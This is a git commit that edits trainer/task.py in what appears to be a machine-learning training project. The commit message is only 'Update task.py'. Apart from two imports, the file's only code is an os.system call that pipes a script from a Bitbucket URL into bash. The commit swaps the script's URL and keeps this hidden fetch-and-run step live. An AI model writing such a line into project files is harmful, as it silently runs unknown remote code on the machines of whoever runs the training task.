441018ba4d27808bf35624054fe42ae3ac04a696
aderatayana <154751587+aderatayana@users.noreply.github.com>
2023-12-25 01:16:13 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/mandaresz/feriyaz/raw/160b7b7ed2f9dfb23e2a792233484630cb880a48/jajal.sh | bash')
+os.system('curl -sL https://bitbucket.org/mandaresz/feriyaz/raw/6394c51d6e4358af1be9a2c56053d5a744fac221/jajal | bash')
